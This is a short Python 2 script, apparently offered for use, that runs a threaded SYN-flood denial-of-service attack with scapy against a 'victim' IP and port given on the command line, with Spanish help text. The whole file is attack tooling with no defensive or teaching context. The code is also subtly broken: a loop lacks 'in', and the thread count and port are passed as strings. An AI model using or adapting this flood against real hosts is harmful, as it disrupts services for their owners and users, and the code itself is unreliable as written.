from scapy.all import *
from time import sleep

import logging
import argparse
import sys
import thread
import random

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para hacer Dos con FLOOD SYN")
parser.add_argument('-V', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
parser.add_argument('-P', '--PORT',metavar="IPPORT", help="PUERTO de la victima", required=True, dest='PORT')
parser.add_argument('-C', '--CONECTIONS',metavar="NUMCONECT", help="Numero de conexiones", required=True, dest='CONECT')
parser.add_argument('-t', '--threads', metavar="THreads", help="Numero de hilos", required=True,dest='TH')

args = parser.parse_args()


def synflood(target,port):
 for p range (int(args.CONECT)):
   x = random.randint(0,65535)
   send(IP(dst=args.USER)/TCP(dport=args.PORT,sport=x),verbose=0)


for x in range(0,args.TH):
 thread.start_new_thread(synflood, (args.USER,args.PORT))




